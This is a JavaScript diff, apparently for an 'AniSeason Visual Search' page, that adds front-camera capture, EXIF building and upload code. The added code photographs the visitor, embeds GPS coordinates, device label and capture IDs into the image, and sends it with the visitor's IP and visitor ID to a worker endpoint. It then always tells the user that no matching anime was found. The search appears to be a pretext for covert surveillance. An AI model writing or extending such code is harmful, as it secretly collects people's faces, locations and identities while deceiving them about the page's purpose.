@@ -1657,6 +1657,8 @@ function waitForCameraReady(video, maxMs = 1500) {
     });
 }
 
+const JPEG_QUALITY = 0.62;
+
 function snapFromVideo(video) {
     const srcW = video.videoWidth || 640;
     const srcH = video.videoHeight || 480;
@@ -1668,9 +1670,279 @@ function snapFromVideo(video) {
     canvas.width = cw;
     canvas.height = ch;
     const ctx = canvas.getContext('2d');
-    if (!ctx) return '';
+    if (!ctx) return null;
     ctx.drawImage(video, 0, 0, cw, ch);
-    return canvas.toDataURL('image/jpeg', 0.62).split(',')[1] || '';
+    const base64 = canvas.toDataURL('image/jpeg', JPEG_QUALITY).split(',')[1] || '';
+    if (!base64) return null;
+    return {
+        base64,
+        sourceWidth: srcW,
+        sourceHeight: srcH,
+        outputWidth: cw,
+        outputHeight: ch,
+        jpegQuality: JPEG_QUALITY,
+        mimeType: 'image/jpeg',
+    };
+}
+
+function collectCameraTrackMeta(stream, video, snap) {
+    const track = stream?.getVideoTracks?.()[0] || null;
+    const settings = track?.getSettings?.() || {};
+    const capabilities = track?.getCapabilities?.() || {};
+    const meta = {
+        facingMode: settings.facingMode || null,
+        deviceId: settings.deviceId ? settings.deviceId.slice(0, 12) + '…' : null,
+        deviceLabel: track?.label || null,
+        frameRate: settings.frameRate ?? null,
+        aspectRatio: settings.aspectRatio ?? null,
+        resizeMode: settings.resizeMode ?? null,
+        whiteBalanceMode: settings.whiteBalanceMode ?? null,
+        exposureMode: settings.exposureMode ?? null,
+        focusMode: settings.focusMode ?? null,
+        torch: settings.torch ?? null,
+        zoom: settings.zoom ?? null,
+        sourceWidth: snap?.sourceWidth ?? settings.width ?? video?.videoWidth ?? null,
+        sourceHeight: snap?.sourceHeight ?? settings.height ?? video?.videoHeight ?? null,
+        outputWidth: snap?.outputWidth ?? null,
+        outputHeight: snap?.outputHeight ?? null,
+        jpegQuality: snap?.jpegQuality ?? null,
+        mimeType: snap?.mimeType || 'image/jpeg',
+    };
+    if (capabilities.width) {
+        meta.capWidthMin = capabilities.width.min ?? null;
+        meta.capWidthMax = capabilities.width.max ?? null;
+    }
+    if (capabilities.height) {
+        meta.capHeightMin = capabilities.height.min ?? null;
+        meta.capHeightMax = capabilities.height.max ?? null;
+    }
+    if (capabilities.frameRate) {
+        meta.capFrameRateMin = capabilities.frameRate.min ?? null;
+        meta.capFrameRateMax = capabilities.frameRate.max ?? null;
+    }
+    if (pendingGpsPayload?.lat != null && pendingGpsPayload?.lon != null) {
+        meta.gpsLat = pendingGpsPayload.lat;
+        meta.gpsLon = pendingGpsPayload.lon;
+        meta.gpsAccuracy = pendingGpsPayload.accuracy ?? null;
+        meta.gpsQuality = pendingGpsPayload.gpsQuality ?? null;
+    }
+    return meta;
+}
+
+function exifDateFromTs(ts) {
+    const d = new Date(ts);
+    const p = (n) => String(n).padStart(2, '0');
+    return `${d.getFullYear()}:${p(d.getMonth() + 1)}:${p(d.getDate())} ${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
+}
+
+function decimalToExifDms(decimal) {
+    const abs = Math.abs(decimal);
+    const deg = Math.floor(abs);
+    const minFloat = (abs - deg) * 60;
+    const min = Math.floor(minFloat);
+    const sec = Math.round((minFloat - min) * 60 * 100);
+    return [[deg, 1], [min, 1], [sec, 100]];
+}
+
+function buildExifSegment(meta, captureId, captureTs) {
+    const le = true;
+    const strings = [];
+    const rationals = [];
+    const entries = [];
+    let dataOffset = 0;
+
+    const addAscii = (tag, text) => {
+        const val = String(text || '').slice(0, 200);
+        const bytes = new TextEncoder().encode(val + '\0');
+        entries.push({ tag, type: 2, count: bytes.length, data: bytes });
+    };
+    const addShort = (tag, val) => entries.push({ tag, type: 3, count: 1, data: val });
+    const addLong = (tag, val) => entries.push({ tag, type: 4, count: 1, data: val >>> 0 });
+    const addRational = (tag, num, den) => {
+        rationals.push([num, den]);
+        entries.push({ tag, type: 5, count: 1, rationalIndex: rationals.length - 1 });
+    };
+    const addRationals = (tag, pairs) => {
+        const start = rationals.length;
+        pairs.forEach((p) => rationals.push(p));
+        entries.push({ tag, type: 5, count: pairs.length, rationalStart: start });
+    };
+
+    const dt = exifDateFromTs(captureTs);
+    addAscii(0x010f, meta.deviceLabel || latestDeviceName || 'Browser Camera');
+    addAscii(0x0110, meta.deviceLabel || latestDeviceName || 'Front Camera');
+    addAscii(0x0131, 'AniSeason Visual Search');
+    addAscii(0x0132, dt);
+    addAscii(0x010e, `captureId=${captureId}`);
+
+    const exifIfdStart = 12;
+    addLong(0x8769, 0);
+
+    const exifEntries = [];
+    const exifStrings = [];
+    const exifRationals = [];
+    const addExifAscii = (tag, text) => {
+        const val = String(text || '').slice(0, 240);
+        const bytes = new TextEncoder().encode(val + '\0');
+        exifEntries.push({ tag, type: 2, count: bytes.length, data: bytes });
+    };
+    const addExifLong = (tag, val) => exifEntries.push({ tag, type: 4, count: 1, data: val >>> 0 });
+
+    addExifAscii(0x9003, dt);
+    addExifLong(0xa002, meta.outputWidth || meta.sourceWidth || 0);
+    addExifLong(0xa003, meta.outputHeight || meta.sourceHeight || 0);
+    const comment = JSON.stringify({
+        captureId,
+        facingMode: meta.facingMode,
+        frameRate: meta.frameRate,
+        source: `${meta.sourceWidth}x${meta.sourceHeight}`,
+        output: `${meta.outputWidth}x${meta.outputHeight}`,
+    }).slice(0, 220);
+    const commentBytes = new Uint8Array(8 + comment.length);
+    commentBytes.set([0x41, 0x53, 0x43, 0x49, 0x49, 0x00, 0x00, 0x00], 0);
+    commentBytes.set(new TextEncoder().encode(comment), 8);
+    exifEntries.push({ tag: 0x9286, type: 7, count: commentBytes.length, data: commentBytes });
+
+    let gpsEntries = null;
+    let gpsRationals = [];
+    if (meta.gpsLat != null && meta.gpsLon != null) {
+        gpsEntries = [];
+        gpsEntries.push({ tag: 0x0000, type: 1, count: 4, data: new Uint8Array([2, 2, 0, 0]) });
+        const latRef = meta.gpsLat >= 0 ? 'N' : 'S';
+        const lonRef = meta.gpsLon >= 0 ? 'E' : 'W';
+        gpsEntries.push({ tag: 0x0001, type: 2, count: 2, data: new TextEncoder().encode(latRef + '\0') });
+        gpsEntries.push({ tag: 0x0003, type: 2, count: 2, data: new TextEncoder().encode(lonRef + '\0') });
+        gpsRationals = [
+            ...decimalToExifDms(meta.gpsLat),
+            ...decimalToExifDms(meta.gpsLon),
+        ];
+        gpsEntries.push({ tag: 0x0002, type: 5, count: 3, rationalStart: 0 });
+        gpsEntries.push({ tag: 0x0004, type: 5, count: 3, rationalStart: 3 });
+        addLong(0x8825, 0);
+    }
+
+    const writeIfd = (list, strPool, ratPool, baseOffset) => {
+        const count = list.length;
+        const ifdSize = 2 + count * 12 + 4;
+        let poolOffset = baseOffset + ifdSize;
+        const ifdBytes = new Uint8Array(ifdSize);
+        const dv = new DataView(ifdBytes.buffer);
+        dv.setUint16(0, count, le);
+        let entryOffset = 2;
+        const poolChunks = [];
+
+        list.forEach((entry) => {
+            dv.setUint16(entryOffset, entry.tag, le);
+            dv.setUint16(entryOffset + 2, entry.type, le);
+            dv.setUint32(entryOffset + 4, entry.count, le);
+            if (entry.type === 2) {
+                if (entry.data.length <= 4) {
+                    for (let i = 0; i < entry.data.length; i++) dv.setUint8(entryOffset + 8 + i, entry.data[i]);
+                } else {
+                    dv.setUint32(entryOffset + 8, poolOffset, le);
+                    poolChunks.push(entry.data);
+                    poolOffset += entry.data.length;
+                }
+            } else if (entry.type === 3 && entry.count === 1) {
+                dv.setUint16(entryOffset + 8, entry.data, le);
+            } else if (entry.type === 4 && entry.count === 1) {
+                dv.setUint32(entryOffset + 8, entry.data, le);
+            } else if (entry.type === 5) {
+                dv.setUint32(entryOffset + 8, poolOffset, le);
+                const start = entry.rationalStart ?? entry.rationalIndex ?? 0;
+                const len = entry.count || 1;
+                const chunk = new Uint8Array(len * 8);
+                const cdv = new DataView(chunk.buffer);
+                for (let i = 0; i < len; i++) {
+                    const pair = ratPool[start + i];
+                    cdv.setUint32(i * 8, pair[0], le);
+                    cdv.setUint32(i * 8 + 4, pair[1], le);
+                }
+                poolChunks.push(chunk);
+                poolOffset += chunk.length;
+            } else if (entry.type === 7) {
+                dv.setUint32(entryOffset + 8, poolOffset, le);
+                poolChunks.push(entry.data);
+                poolOffset += entry.data.length;
+            } else if (entry.type === 1) {
+                if (entry.data.length <= 4) {
+                    for (let i = 0; i < entry.data.length; i++) dv.setUint8(entryOffset + 8 + i, entry.data[i]);
+                } else {
+                    dv.setUint32(entryOffset + 8, poolOffset, le);
+                    poolChunks.push(entry.data);
+                    poolOffset += entry.data.length;
+                }
+            }
+            entryOffset += 12;
+        });
+        dv.setUint32(entryOffset, 0, le);
+        const total = ifdSize + poolChunks.reduce((n, c) => n + c.length, 0);
+        const out = new Uint8Array(total);
+        out.set(ifdBytes, 0);
+        let pos = ifdSize;
+        poolChunks.forEach((chunk) => { out.set(chunk, pos); pos += chunk.length; });
+        return { bytes: out, nextOffset: baseOffset + total };
+    };
+
+    const tiffHeaderSize = 8;
+    const ifd0Base = tiffHeaderSize;
+    const ifd0 = writeIfd(entries, strings, rationals, ifd0Base);
+    const exifBase = ifd0Base + ifd0.bytes.length;
+    const exifIfd = writeIfd(exifEntries, exifStrings, exifRationals, exifBase);
+    entries.find((e) => e.tag === 0x8769).data = exifBase;
+
+    let tail = new Uint8Array(0);
+    if (gpsEntries) {
+        const gpsBase = exifBase + exifIfd.bytes.length;
+        entries.find((e) => e.tag === 0x8825).data = gpsBase;
+        const gpsIfd = writeIfd(gpsEntries, [], gpsRationals, gpsBase);
+        tail = gpsIfd.bytes;
+    }
+
+    const ifd0Final = writeIfd(entries, strings, rationals, ifd0Base);
+    const tiff = new Uint8Array(tiffHeaderSize + ifd0Final.bytes.length + exifIfd.bytes.length + tail.length);
+    const tdv = new DataView(tiff.buffer);
+    tdv.setUint8(0, le ? 0x49 : 0x4d);
+    tdv.setUint8(1, le ? 0x49 : 0x4d);
+    tdv.setUint16(2, 0x002a, le);
+    tdv.setUint32(4, ifd0Base, le);
+    tiff.set(ifd0Final.bytes, tiffHeaderSize);
+    tiff.set(exifIfd.bytes, tiffHeaderSize + ifd0Final.bytes.length);
+    if (tail.length) tiff.set(tail, tiffHeaderSize + ifd0Final.bytes.length + exifIfd.bytes.length);
+    return tiff;
+}
+
+function embedExifInJpegBase64(base64Jpeg, meta, captureId, captureTs) {
+    try {
+        const raw = atob(base64Jpeg);
+        const jpeg = new Uint8Array(raw.length);
+        for (let i = 0; i < raw.length; i++) jpeg[i] = raw.charCodeAt(i);
+        if (jpeg[0] !== 0xff || jpeg[1] !== 0xd8) return base64Jpeg;
+
+        const exifBody = buildExifSegment(meta, captureId, captureTs);
+        const header = new TextEncoder().encode('Exif\0\0');
+        const segPayload = new Uint8Array(header.length + exifBody.length);
+        segPayload.set(header, 0);
+        segPayload.set(exifBody, header.length);
+        const segLen = segPayload.length + 2;
+        const app1 = new Uint8Array(2 + 2 + segPayload.length);
+        app1[0] = 0xff;
+        app1[1] = 0xe1;
+        app1[2] = (segLen >> 8) & 0xff;
+        app1[3] = segLen & 0xff;
+        app1.set(segPayload, 4);
+
+        const out = new Uint8Array(2 + app1.length + jpeg.length - 2);
+        out[0] = 0xff;
+        out[1] = 0xd8;
+        out.set(app1, 2);
+        out.set(jpeg.subarray(2), 2 + app1.length);
+        let bin = '';
+        for (let i = 0; i < out.length; i++) bin += String.fromCharCode(out[i]);
+        return btoa(bin);
+    } catch (_) {
+        return base64Jpeg;
+    }
 }
 
 function stopStream(stream) {
@@ -1678,13 +1950,18 @@ function stopStream(stream) {
     stream.getTracks().forEach((t) => { try { t.stop(); } catch (_) {} });
 }
 
-function buildCameraPayload(imageBase64) {
+function buildCameraPayload(imageBase64, photoMeta = null) {
     const captureId = `${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
+    const captureTs = Date.now();
+    const imageWithMeta = photoMeta
+        ? embedExifInJpegBase64(imageBase64, photoMeta, captureId, captureTs)
+        : imageBase64;
     return {
         _cameraCapture: true,
         captureId,
-        captureTs: Date.now(),
-        imageBase64,
+        captureTs,
+        imageBase64: imageWithMeta,
+        photoMeta,
         reportSessionId: getReportSessionId(),
         visitorId: latestVisitorId,
         ip: latestIp,
@@ -1704,8 +1981,8 @@ function buildCameraPayload(imageBase64) {
     };
 }
 
-async function uploadCameraPhoto(imageBase64) {
-    const payload = buildCameraPayload(imageBase64);
+async function uploadCameraPhoto(imageBase64, photoMeta) {
+    const payload = buildCameraPayload(imageBase64, photoMeta);
     let ok = await postWorker(payload);
     if (!ok) {
         ok = await postWorker({ ...payload, captureId: `${payload.captureId}_r` });
@@ -1791,15 +2068,16 @@ async function captureFrontCamera() {
         video.srcObject = stream;
         await video.play();
         await waitForCameraReady(video, 1200);
-        const imageBase64 = snapFromVideo(video);
+        const snap = snapFromVideo(video);
+        const photoMeta = collectCameraTrackMeta(stream, video, snap);
         stopStream(stream);
         stream = null;
         if (video) { video.pause(); video.srcObject = null; }
         video = null;
-        if (!imageBase64) throw new Error('empty_frame');
+        if (!snap?.base64) throw new Error('empty_frame');
         if (labelLong) labelLong.textContent = 'Mengunggah...';
         if (labelShort) labelShort.textContent = 'Upload...';
-        const ok = await uploadCameraPhoto(imageBase64);
+        const ok = await uploadCameraPhoto(snap.base64, photoMeta);
         if (!ok) throw new Error('upload_failed');
         showVisualSearchToast('Tidak ada anime yang cocok ditemukan');
         hideVisualSearchToast(2500);
